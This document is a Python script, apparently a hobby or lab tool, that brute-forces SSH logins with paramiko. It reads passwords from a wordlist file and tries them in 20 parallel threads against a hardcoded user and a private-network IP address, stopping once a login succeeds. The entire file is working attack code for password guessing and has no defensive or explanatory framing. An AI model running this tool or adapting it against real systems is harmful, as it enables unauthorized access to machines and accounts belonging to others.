import paramiko
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

default_port = 22
found = False
lock = threading.Lock()

def ssh_login(username, password, ip, port):
    global found
    with lock:
        if found:
            return False, password

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port, username, password)
        print(f'Connection is successful: {username}:{password}')
        client.close()

        with lock:
            found = True
        return True, password

    except paramiko.AuthenticationException:
        print(f'Authentication failed for {username}:{password}\n')
        return False, password

    except Exception as e:
        print(f'There is a problem with the connection: {e}')
        return False, password

def main():
    global found
    hostname = 'mansurov'
    ip = '192.168.1.233'

    with open('passwd.txt', 'r') as file:
        passwords = [line.strip() for line in file]

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(ssh_login, hostname, password, ip, default_port) for password in passwords]

        for future in as_completed(futures):
            success, password = future.result()
            if success:
                print('Correct password found!', password)
                with lock:
                    found = True
                executor.shutdown(wait=True)
                break
    
    if not found:
        sys.exit(1)

if __name__ == '__main__':
    main()
